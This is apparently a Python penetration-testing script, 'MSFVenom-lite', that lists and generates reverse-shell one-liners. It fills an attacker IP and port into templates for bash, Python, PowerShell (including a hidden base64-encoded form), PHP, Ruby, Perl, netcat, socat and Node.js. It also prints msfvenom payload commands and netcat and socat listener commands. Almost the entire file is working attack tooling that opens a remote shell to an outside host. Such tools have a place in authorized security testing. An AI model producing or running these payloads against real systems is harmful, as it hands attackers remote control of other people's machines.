#!/usr/bin/env python3
"""Payload info tool: list common payload types, generate reverse shell one-liners."""
import argparse
import base64
import sys
from urllib.parse import quote

# Security tool: these templates are for authorized penetration testing only.
# They generate reference strings for security assessments.
PAYLOADS = {
    "bash-tcp": {
        "name": "Bash TCP Reverse Shell",
        "platform": "linux", "language": "bash",
        "template": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "description": "Basic bash reverse shell over TCP",
    },
    "bash-udp": {
        "name": "Bash UDP Reverse Shell",
        "platform": "linux", "language": "bash",
        "template": "bash -i >& /dev/udp/{lhost}/{lport} 0>&1",
        "description": "Bash reverse shell over UDP",
    },
    "python-tcp": {
        "name": "Python TCP Reverse Shell",
        "platform": "cross-platform", "language": "python",
        "template": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "description": "Python reverse shell (works on Linux/Mac)",
    },
    "python-windows": {
        "name": "Python Windows Reverse Shell",
        "platform": "windows", "language": "python",
        "template": "python -c \"import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));subprocess.call(['cmd.exe'],stdin=s,stdout=s,stderr=s)\"",
        "description": "Python reverse shell for Windows",
    },
    "powershell-tcp": {
        "name": "PowerShell TCP Reverse Shell",
        "platform": "windows", "language": "powershell",
        "template": "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        "description": "PowerShell reverse shell",
    },
    "powershell-encoded": {
        "name": "PowerShell Base64 Encoded",
        "platform": "windows", "language": "powershell",
        "template": "ENCODED",
        "base_template": "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        "description": "Base64 encoded PowerShell reverse shell",
    },
    "php-tcp": {
        "name": "PHP TCP Reverse Shell",
        "platform": "cross-platform", "language": "php",
        "template": "php -r '$sock=fsockopen(\"{lhost}\",{lport});$proc=proc_open(\"/bin/sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
        "description": "PHP reverse shell one-liner",
    },
    "ruby-tcp": {
        "name": "Ruby TCP Reverse Shell",
        "platform": "cross-platform", "language": "ruby",
        "template": "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "description": "Ruby reverse shell",
    },
    "perl-tcp": {
        "name": "Perl TCP Reverse Shell",
        "platform": "cross-platform", "language": "perl",
        "template": "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");}};'",
        "description": "Perl reverse shell",
    },
    "nc-traditional": {
        "name": "Netcat Traditional",
        "platform": "linux", "language": "netcat",
        "template": "nc -e /bin/sh {lhost} {lport}",
        "description": "Netcat reverse shell (requires -e flag support)",
    },
    "nc-mkfifo": {
        "name": "Netcat with mkfifo",
        "platform": "linux", "language": "netcat",
        "template": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "description": "Netcat reverse shell using named pipe",
    },
    "socat-tcp": {
        "name": "Socat TCP Reverse Shell",
        "platform": "linux", "language": "socat",
        "template": "socat TCP:{lhost}:{lport} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
        "description": "Socat reverse shell with PTY",
    },
    "node-tcp": {
        "name": "Node.js TCP Reverse Shell",
        "platform": "cross-platform", "language": "nodejs",
        "template": "node -e '(function(){{var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var client=new net.Socket();client.connect({lport},\"{lhost}\",function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});}})();'",
        "description": "Node.js reverse shell",
    },
    "msfvenom-linux-elf": {
        "name": "MSFVenom Linux ELF (reference)",
        "platform": "linux", "language": "msfvenom",
        "template": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf",
        "description": "MSFVenom command to generate Linux ELF payload",
    },
    "msfvenom-windows-exe": {
        "name": "MSFVenom Windows EXE (reference)",
        "platform": "windows", "language": "msfvenom",
        "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe",
        "description": "MSFVenom command to generate Windows EXE payload",
    },
    "listener-nc": {
        "name": "Netcat Listener (reference)",
        "platform": "cross-platform", "language": "netcat",
        "template": "nc -nlvp {lport}",
        "description": "Netcat listener command (run on attacker machine)",
    },
    "listener-socat": {
        "name": "Socat Listener (reference)",
        "platform": "cross-platform", "language": "socat",
        "template": "socat file:`tty`,raw,echo=0 tcp-listen:{lport}",
        "description": "Socat listener with full PTY (run on attacker machine)",
    },
}


def generate_payload(payload_name, lhost, lport):
    """Generate a payload with the given parameters."""
    if payload_name not in PAYLOADS:
        return None
    p = PAYLOADS[payload_name]
    if payload_name == "powershell-encoded":
        base_cmd = p["base_template"].format(lhost=lhost, lport=lport)
        encoded = base64.b64encode(base_cmd.encode("utf-16le")).decode()
        return f"powershell -nop -w hidden -enc {encoded}"
    return p["template"].format(lhost=lhost, lport=lport)


def main():
    ap = argparse.ArgumentParser(description="MSFVenom-lite: Payload info and reverse shell generator")
    ap.add_argument("target", nargs="?", default="list", help="Payload name or 'list' to show all")
    ap.add_argument("-l", "--lhost", default="ATTACKER_IP", help="Local host (attacker IP)")
    ap.add_argument("-p", "--lport", default="4444", help="Local port")
    ap.add_argument("--platform", choices=["linux", "windows", "cross-platform", "all"], default="all",
                    help="Filter by platform")
    ap.add_argument("--language", help="Filter by language (bash, python, powershell, etc.)")
    ap.add_argument("--all", action="store_true", help="Generate all payloads")
    args = ap.parse_args()

    print("[*] MSFVenom-Lite: Payload Info & Generator\n")

    if args.target == "list" or args.all:
        if args.all and args.lhost != "ATTACKER_IP":
            print(f"[*] Generating all payloads for {args.lhost}:{args.lport}\n")
            for name, info in sorted(PAYLOADS.items()):
                if args.platform != "all" and info["platform"] != args.platform:
                    continue
                if args.language and info["language"] != args.language:
                    continue
                payload = generate_payload(name, args.lhost, args.lport)
                print(f"  === {info['name']} ===")
                print(f"  Platform: {info['platform']} | Language: {info['language']}")
                print(f"  {info['description']}")
                print(f"\n  {payload}\n")
        else:
            print(f"  {'PAYLOAD':<25} {'PLATFORM':<18} {'LANGUAGE':<12} {'DESCRIPTION'}")
            print(f"  {'-'*25} {'-'*18} {'-'*12} {'-'*35}")
            for name, info in sorted(PAYLOADS.items()):
                if args.platform != "all" and info["platform"] != args.platform:
                    continue
                if args.language and info["language"] != args.language:
                    continue
                print(f"  {name:<25} {info['platform']:<18} {info['language']:<12} {info['description'][:35]}")
            print(f"\n  Total: {len(PAYLOADS)} payloads")
            print(f"\n  Usage: python3 msfvenom-lite.py <payload_name> -l <LHOST> -p <LPORT>")
    else:
        name = args.target
        if name not in PAYLOADS:
            print(f"[!] Unknown payload: {name}")
            print(f"[*] Use 'list' to see available payloads")
            sys.exit(1)

        info = PAYLOADS[name]
        payload = generate_payload(name, args.lhost, args.lport)

        print(f"  Payload:     {info['name']}")
        print(f"  Platform:    {info['platform']}")
        print(f"  Language:    {info['language']}")
        print(f"  Description: {info['description']}")
        print(f"  LHOST:       {args.lhost}")
        print(f"  LPORT:       {args.lport}")
        print(f"\n  Command:")
        print(f"  {payload}")

        if "listener" not in name:
            listener = generate_payload("listener-nc", args.lhost, args.lport)
            print(f"\n  Listener (run on attacker):")
            print(f"  {listener}")

        if args.lhost == "ATTACKER_IP":
            print(f"\n  [!] Replace ATTACKER_IP with your actual IP address")


if __name__ == "__main__":
    main()
